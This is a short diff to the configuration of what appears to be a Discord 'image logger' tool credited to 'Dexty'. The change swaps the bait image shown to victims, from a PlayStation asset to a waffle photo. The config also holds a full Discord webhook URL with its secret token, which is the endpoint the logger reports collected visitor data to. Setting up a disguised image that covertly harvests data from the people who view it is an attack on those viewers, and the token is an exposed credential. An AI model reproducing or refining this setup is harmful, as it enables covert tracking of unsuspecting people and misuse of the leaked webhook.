@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1417337577748299788/XWFK6XWhua2IrtSz3OeZA9OVeGDUrNKPMJLX-S54V7HqGAYmdD6x5A4redP89Fo4Un3_",
-    "image": "https://image.api.playstation.com/vulcan/ap/rnd/202505/3100/ef79f649e45961a7e6342ebf26bc827b8b9603d69b2fdb5c.png", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/Waffles_with_Strawberries.jpg/1280px-Waffles_with_Strawberries.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
